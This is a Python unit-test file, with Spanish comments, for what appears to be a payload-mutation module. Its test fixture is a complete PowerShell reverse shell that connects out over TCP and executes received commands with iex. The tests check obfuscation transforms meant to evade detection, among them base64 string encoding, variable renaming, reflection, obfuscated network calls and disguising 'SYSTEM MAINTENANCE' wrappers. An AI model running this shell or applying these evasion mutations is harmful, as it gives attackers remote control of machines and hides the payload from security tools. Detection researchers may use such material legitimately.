"""
Tests unitarios para el módulo mutations.py
"""
import unittest
import hashlib
from mutations import (
    apply_aggressive_mutation,
    analyze_payload_detailed,
    validate_mutation_applied
)


class TestMutations(unittest.TestCase):
    """Tests para funciones de mutación"""

    def setUp(self):
        """Setup: payload de prueba"""
        self.test_payload = '''$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 9999);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush()
};
$client.Close()'''

    def test_encode_all_strings_base64(self):
        """Test: codificación Base64 de strings"""
        mutated = apply_aggressive_mutation(self.test_payload, 'encode_all_strings_base64', 'test1')
        self.assertNotEqual(self.test_payload, mutated)
        self.assertIn('Base64String', mutated)

    def test_split_commands_aggressive(self):
        """Test: división agresiva de comandos"""
        mutated = apply_aggressive_mutation(self.test_payload, 'split_commands_aggressive', 'test2')
        self.assertNotEqual(self.test_payload, mutated)

    def test_rename_all_variables(self):
        """Test: renombrado de variables"""
        mutated = apply_aggressive_mutation(self.test_payload, 'rename_all_variables', 'test3')
        self.assertNotEqual(self.test_payload, mutated)
        # Verificar que las variables fueron renombradas
        self.assertNotIn('$client', mutated) or self.assertIn('$var_', mutated)

    def test_add_multiple_benign_wrappers(self):
        """Test: añadir wrappers benignos"""
        mutated = apply_aggressive_mutation(self.test_payload, 'add_multiple_benign_wrappers', 'test4')
        self.assertNotEqual(self.test_payload, mutated)
        self.assertIn('SYSTEM MAINTENANCE', mutated)

    def test_change_entire_syntax(self):
        """Test: cambio de sintaxis"""
        mutated = apply_aggressive_mutation(self.test_payload, 'change_entire_syntax', 'test5')
        # Verificar que se aplicaron cambios
        self.assertTrue(
            self.test_payload != mutated or 
            'NewObject' in mutated or 
            'GetStreamMethod' in mutated
        )

    def test_insert_random_whitespace(self):
        """Test: inserción de espacios aleatorios"""
        mutated = apply_aggressive_mutation(self.test_payload, 'insert_random_whitespace', 'test6')
        self.assertNotEqual(self.test_payload, mutated)

    def test_obfuscate_network_calls(self):
        """Test: ofuscación de llamadas de red"""
        mutated = apply_aggressive_mutation(self.test_payload, 'obfuscate_network_calls', 'test7')
        # Si contiene TCPClient, debería cambiar
        if 'TCPClient' in self.test_payload:
            self.assertNotEqual(self.test_payload, mutated)

    def test_use_reflection_methods(self):
        """Test: uso de métodos de reflexión"""
        mutated = apply_aggressive_mutation(self.test_payload, 'use_reflection_methods', 'test8')
        # Verificar que se aplicaron cambios si hay métodos relevantes
        if 'GetStream()' in self.test_payload:
            self.assertNotEqual(self.test_payload, mutated)

    def test_add_fake_error_handling(self):
        """Test: añadir manejo de errores falso"""
        mutated = apply_aggressive_mutation(self.test_payload, 'add_fake_error_handling', 'test9')
        self.assertNotEqual(self.test_payload, mutated)
        self.assertIn('try', mutated)

    def test_modify_encoding_methods(self):
        """Test: modificar métodos de encoding"""
        mutated = apply_aggressive_mutation(self.test_payload, 'modify_encoding_methods', 'test10')
        # Si contiene text.encoding, debería cambiar
        if 'text.encoding' in self.test_payload.lower():
            self.assertNotEqual(self.test_payload, mutated)

    def test_analyze_payload_detailed(self):
        """Test: análisis detallado de payload"""
        analysis = analyze_payload_detailed(self.test_payload)
        
        self.assertIn('length', analysis)
        self.assertIn('lines', analysis)
        self.assertIn('variables', analysis)
        self.assertIn('methods', analysis)
        self.assertIn('hash', analysis)
        
        self.assertGreater(analysis['length'], 0)
        self.assertGreater(analysis['lines'], 0)
        self.assertIsInstance(analysis['variables'], list)
        self.assertIsInstance(analysis['methods'], list)

    def test_validate_mutation_applied(self):
        """Test: validación de mutación aplicada"""
        # Test con payload diferente
        mutated = apply_aggressive_mutation(self.test_payload, 'rename_all_variables', 'test11')
        is_valid, message = validate_mutation_applied(self.test_payload, mutated)
        self.assertTrue(is_valid)
        self.assertIn('Mutation applied', message)
        
        # Test con payload idéntico
        is_valid, message = validate_mutation_applied(self.test_payload, self.test_payload)
        self.assertFalse(is_valid)
        self.assertIn('No changes', message)

    def test_mutation_always_changes_payload(self):
        """Test: todas las mutaciones deben cambiar el payload"""
        actions = [
            'encode_all_strings_base64',
            'split_commands_aggressive',
            'rename_all_variables',
            'add_multiple_benign_wrappers',
            'change_entire_syntax',
            'insert_random_whitespace',
            'obfuscate_network_calls',
            'use_reflection_methods',
            'add_fake_error_handling',
            'modify_encoding_methods'
        ]
        
        for action in actions:
            with self.subTest(action=action):
                mutated = apply_aggressive_mutation(self.test_payload, action, f'test_{action}')
                is_valid, _ = validate_mutation_applied(self.test_payload, mutated)
                self.assertTrue(is_valid, f"La mutación {action} no cambió el payload")


if __name__ == '__main__':
    unittest.main()

